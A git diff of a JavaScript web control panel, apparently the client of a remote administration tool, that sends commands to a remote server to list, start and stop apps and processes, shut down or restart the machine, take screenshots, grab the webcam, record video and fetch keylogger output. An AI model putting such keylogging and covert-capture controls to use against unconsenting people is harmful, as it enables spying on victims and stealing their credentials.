@@ -1,149 +1,126 @@
-console.log("asjdkljdalksfdasf")
-let IP = "";            
+let SERVER_IP = ""; 
+const PORT = 6969;
 
-async function postControl(payload){
-    let url = "";
-    // Map command sang route server
-    switch(payload.command){
-        case "listApp":
-            url = `http://${IP}:8080/apps`;
-            break;
-        case "listProcess":
-            url = `http://${IP}:8080/processes`;
-            break;
-        case "recordVideo":
-            url = `http://${IP}:8080/recordVideo?seconds=${payload.seconds}`;
-            break;
-        case "screenshot":
-            url = `http://${IP}:8080/screenshot`;
-            break;
-        case "startApp":
-            url = `http://${IP}:8080/startApp?name=${payload.name}`;
-            break;
-        case "stopProcess":
-            url = `http://${IP}:8080/stopProcess?name=${payload.name}`;
-            break;
-        case "getKeylog":
-            url = `http://${IP}:8080/getKeylog`;
-            break;
-        default:
-            throw new Error("Unknown command");
-    }
-
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), 15000);
-
-    try {
-        const res = await fetch(url, { method: "GET", signal: controller.signal });
-        clearTimeout(id);
-        return res.text();
-    } catch (e) {
-        clearTimeout(id);
-        throw e;
-    }
+// Hàm hiển thị thông báo (Toast)
+function showToast(msg, type = "success") {
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.innerHTML = `<i class="fa-solid ${type === 'error' ? 'fa-circle-exclamation' : 'fa-check'}"></i> ${msg}`;
+    container.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.style.animation = 'slideIn 0.3s reverse';
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
 }
 
-
-async function postControl(payload){
-    let url = "";
-    if(payload.command === "listApp") url = `http://localhost:6969/apps`;
-    else if(payload.command === "listProcess") url = `http://localhost:6969/processes`;
-    else if(payload.command === "recordVideo") url = `http://localhost:6969/recordVideo?seconds=${payload.seconds}`;
-    else if(payload.command === "screenshot") url = `http://localhost:6969/screenshot`;
-
-    const controller = new AbortController();
-    const id = setTimeout(() => controller.abort(), 15000);
-    try {
-        const res = await fetch(url, { method: "GET", signal: controller.signal });
-        clearTimeout(id);
-        return res.text();
-    } catch (e) {
-        clearTimeout(id);
-        throw e;
+// Hàm gửi request tới C++ Server
+async function sendRequest(route) {
+    if (!SERVER_IP) {
+        showToast("You need to connect to the server first.", "error");
+        return null;
     }
-}
 
-
-document.getElementById('btnConnect').addEventListener('click', async ()=>{
-    const ip = document.getElementById('ipInput').value.trim();
-    if(!ip) { showToast("Nhập IP đi bạn!", "error"); return; }
     try {
-        const res = await fetch(`http://${ip}:8080/ping`);
-        if(res.ok) {
-            IP = ip;
-            document.getElementById('connectStatus').innerHTML = `Connected: ${IP}`;
-            document.getElementById('connectStatus').style.color = "#34d399";
-            document.getElementById('btnConnect').style.display = 'none';
-            document.getElementById('btnDisconnect').style.display = 'inline-block';
-            showToast("Kết nối thành công!");
+        const url = `http://${SERVER_IP}:${PORT}${route}`;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000); // Timeout 5s
+
+        const response = await fetch(url, { 
+            method: 'GET',
+            signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+            throw new Error(`Server Error: ${response.status}`);
         }
-    } catch(e){ showToast("Lỗi kết nối!", "error"); }
+        return await response.text();
+    } catch (e) {
+        console.error(e);
+        showToast(`Error: ${e.message}`, "error");
+        return null;
+    }
+}
+
+// --- LOGIC KẾT NỐI ---
+document.getElementById('btnConnect').addEventListener('click', async () => {
+    const ipInput = document.getElementById('ipInput').value.trim();
+    if (!ipInput) return showToast("Please enter IP!", "error");
+
+    // Thử ping
+    SERVER_IP = ipInput; 
+    const res = await sendRequest('/ping');
+    
+    if (res) {
+        showToast("Connected successfully!");
+        document.getElementById('connectStatus').innerHTML = `Connected: <span style="color:var(--success)">${SERVER_IP}</span>`;
+        document.getElementById('connectionPanel').style.display = 'none'; // Ẩn panel kết nối
+        document.getElementById('disconnectPanel').style.display = 'flex'; // Hiện nút disconnect
+    } else {
+        SERVER_IP = ""; // Reset nếu lỗi
+    }
 });
 
-document.getElementById('btnDisconnect').addEventListener('click', ()=>{
-    IP = "";
-    document.getElementById('connectStatus').innerHTML = "Disconnected";
-    document.getElementById('connectStatus').style.color = "#94a3b8";
-    document.getElementById('btnConnect').style.display = 'inline-block';
-    document.getElementById('btnDisconnect').style.display = 'none';
+document.getElementById('btnDisconnect').addEventListener('click', () => {
+    SERVER_IP = "";
+    document.getElementById('connectStatus').innerHTML = "Status: Disconnected";
+    document.getElementById('connectionPanel').style.display = 'flex';
+    document.getElementById('disconnectPanel').style.display = 'none';
+    showToast("Disconnected.");
 });
 
-window.sendCommand = async function(cmd){
-    // if(!IP) { showToast("Chưa kết nối!", "error"); return; }
-    
-    if(cmd === 'recordVideo') {
-        const sec = document.getElementById('recSeconds').value;
-        showToast(`🎥 Đang quay ${sec}s `, "");
-        
-        // 1. Gửi lệnh
-        const path = await postControl({command:'recordVideo', seconds: sec});
-        
-        if(path.includes("Loi") || path.includes("Error")) {
-            showToast(path, "error");
-            document.getElementById('recordResult').innerHTML = `<div style="color:red">${path}</div>`;
-        } else {
-            // 2. Tạo URL (Thêm timestamp để không cache video cũ)
-            const timestamp = new Date().getTime();
-            const fullUrl = `http://${IP}:8080${path}?t=${timestamp}`;
-            
-            // 3. Tạo tên file khi tải về
-            const downloadName = `Evidence_Video_${timestamp}.mp4`;
+// --- LOGIC GỬI LỆNH TỪNG TRANG ---
 
-            document.getElementById('recordResult').innerHTML = `
-                <div style="background:#1e293b; padding:15px; border-radius:8px; margin-top:10px; border: 1px solid #475569;">                    
-                    <video controls autoplay width="100%" style="border-radius:5px; border:1px solid #334155; max-height: 300px;">
-                        <source src="${fullUrl}" type="video/mp4">
-                        Trình duyệt không hỗ trợ thẻ video.
-                    </video>
-                </div>`;
-            
-            showToast("Đã xong! Video đang phát.");
+// 1. Applications
+async function sendCommand(cmd) {
+    let route = "";
+    
+    // Map command sang route
+    if (cmd === 'listApp') route = '/apps';
+    else if (cmd === 'listProcess') route = '/processes';
+    else if (cmd === 'startApp') {
+        const name = document.getElementById('appName').value;
+        if (!name) return showToast("Please enter app name!", "error");
+        route = `/apps/start?name=${encodeURIComponent(name)}`;
+    }
+    else if (cmd === 'stopApp') {
+        const name = document.getElementById('appName').value;
+        if (!name) return showToast("Please enter app name!", "error");
+        route = `/apps/stop?name=${encodeURIComponent(name)}`;
+    }
+    else if (cmd === 'stopProcess') {
+        const pid = document.getElementById('processName').value;
+        if (!pid) return showToast("Please enter PID or process name!", "error");
+        route = `/processes/stop?name=${encodeURIComponent(pid)}`;
+    }
+    else if (cmd === 'shutdown') route = '/shutdown';
+    else if (cmd === 'restart') route = '/restart';
+    else if (cmd === 'getKeylog') route = '/keylogger/get';
+
+    else if (cmd === 'screenshot') route = '/screenshot';
+    else if (cmd === 'webcam') route = '/webcam';
+
+    // Gửi request
+    const result = await sendRequest(route);
+    
+    if (result) {
+        if (cmd === 'listApp') {
+            document.getElementById('appList').innerHTML = result;
+            showToast("App list updated.");
+        } 
+        else if (cmd === 'listProcess') {
+            document.getElementById('processList').innerHTML = result;
+            showToast("Processes list updated");
         }
-        return;
+        else if (cmd === 'getKeylog') {
+            document.getElementById('keylogResult').innerText = result || "No data fetched...";
+        }
+        else {
+            // Các lệnh hành động (Start/Stop) thường trả về text thông báo
+            showToast(result);
+        }
     }
-    if(cmd === 'screenshot') {
-        const path = await postControl({command:'screenshot'});
-        const fullUrl = `http://${IP}:8080${path}?t=${new Date().getTime()}`;
-        document.getElementById('screenshotResult').innerHTML = `<img src="${fullUrl}" style="width:100%; border-radius:8px;">`;
-        return;
-    }
-
-    let payload = {command: cmd};
-    if(cmd === 'startApp' || cmd === 'stopProcess') {
-        const val = (cmd==='startApp') ? document.getElementById('appName').value : document.getElementById('processName').value;
-        payload.name = val;
-    }
-    const res = await postControl(payload);
-    
-    if(cmd === 'listApp') document.getElementById('appList').innerHTML = res;
-    else if(cmd === 'listProcess') document.getElementById('processList').innerHTML= res;
-    else if(cmd === 'getKeylog') document.getElementById('keylogResult').innerText = res;
-    else showToast(res);
-};
-
-function startOnWebcam(){
-    if(IP) document.getElementById('onWebcamContainer').innerHTML = `<img src="http://${IP}:8080/camera?t=${Date.now()}" style="width:100%">`;
-}
-function stopOnWebcam(){
-    document.getElementById('onWebcamContainer').innerHTML = "Camera Off";
 }
